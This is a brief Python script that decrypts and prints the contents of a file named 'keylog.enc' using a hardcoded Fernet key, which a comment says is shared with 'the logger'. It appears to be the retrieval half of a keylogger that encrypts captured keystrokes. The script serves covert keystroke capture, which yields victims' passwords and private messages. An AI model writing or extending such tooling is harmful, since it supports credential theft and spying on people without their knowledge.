from cryptography.fernet import Fernet

key = b'5RbxN9kmEbrtPyCosilmY_IAjWfVVX-GzCiwturs4Zo='  # same as logger
fernet = Fernet(key)

with open("keylog.enc", "rb") as f:
    for line in f:
        try:
            decrypted = fernet.decrypt(line.strip())
            print(decrypted.decode())
        except Exception as e:
            print(f"[!] Failed to decrypt line: {e}")

